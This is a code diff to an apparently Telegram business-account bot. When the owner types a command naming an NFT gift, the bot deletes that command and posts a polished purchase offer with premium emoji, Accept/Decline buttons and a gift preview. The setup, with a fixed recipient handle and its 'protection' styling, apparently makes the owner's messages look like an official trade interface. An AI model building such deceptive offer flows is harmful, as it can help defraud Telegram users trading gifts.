@@ -26,15 +26,16 @@ GIFT_RE = re.compile(r"t\.me/nft/([A-Za-z]+?)-(\d+)")
 RECIPIENT = "@tradiqx"
 LANG_TAGS = {"ru", "ukr", "eng", "cn", "en", "uk", "zh"}
 
-E_GEM   = "5318901904686754959"
-E_WARN  = "6030563507299160824"
-E_OK    = "5774022692642492953"
-E_NO    = "5774077015388852135"
-E_TIMER = "6037268453759389862"
-E_GIFT  = "5773677501825945508"
-E_STAR  = "6028338546736107668"
-E_CHECK = "5774022692642492953"
-E_LOCK  = "5774077015388852135"
+# ---- Premium emoji IDs (все 7) ----
+E_GEM   = "5318901904686754959"   # 💎 алмаз / GRAM
+E_WARN  = "6030563507299160824"   # ⚠ восклицание
+E_OK    = "5774022692642492953"   # ✅ галочка (кнопка «Принять»)
+E_NO    = "5774077015388852135"   # ❌ крестик (кнопка «Отклонить»)
+E_TIMER = "6037268453759389862"   # ⏱ часы
+E_GIFT  = "5773677501825945508"   # 🎁 подарок
+E_STAR  = "6028338546736107668"   # ⭐ звезда
+E_CHECK = "5774022692642492953"   # ✅ галочка (финал)
+E_LOCK  = "5774077015388852135"   # 🔒 замок (используем крестик как «защита»)
 
 
 def em(eid: str, fallback: str) -> str:
@@ -337,10 +338,6 @@ def gen_order_id():
     )
 
 
-# chat_id → последний message_id от пользователя (не от оператора)
-_last_user_msg: dict[int, int] = {}
-
-
 def _business_offer_from_owner(message: Message) -> bool:
     if message.chat.type != "private" or not message.from_user:
         return False
@@ -357,10 +354,7 @@ async def handle_business_message(message: Message):
     bcid = message.business_connection_id
     if not bcid:
         return
-
-    # сообщение от пользователя — запоминаем
     if not _business_offer_from_owner(message):
-        _last_user_msg[message.chat.id] = message.message_id
         return
 
     parsed = parse_command(message.text or "")
@@ -372,6 +366,7 @@ async def handle_business_message(message: Message):
     if not gift:
         return
     gift_name, gift_num = gift
+    preview_url = _gift_preview_url(gift_name, gift_num)
 
     try:
         await bot.delete_business_messages(
@@ -381,22 +376,19 @@ async def handle_business_message(message: Message):
     except Exception as e:
         logging.warning(f"delete error: {e}")
 
-    reply_to = _last_user_msg.get(message.chat.id)
-    logging.warning(f"[send] chat={message.chat.id} reply_to={reply_to}")
-
     try:
-        from aiogram.types import ReplyParameters
-        send_kwargs = dict(
+        await bot.send_message(
             chat_id=message.chat.id,
             text=build_offer_text(amount, currency, gift_name, gift_num, lang),
             reply_markup=make_offer_keyboard(amount, currency, gift_name, gift_num, lang),
+            business_connection_id=bcid,
+            link_preview_options=LinkPreviewOptions(
+                url=preview_url,
+                prefer_large_media=True,
+            ),
         )
-        if reply_to:
-            send_kwargs["reply_parameters"] = ReplyParameters(message_id=reply_to)
-        await bot.send_message(**send_kwargs)
-        logging.warning(f"[send] OK")
     except Exception as e:
-        logging.warning(f"[send] ERROR: {e}")
+        logging.error(f"send error: {e}")
         return
 
 
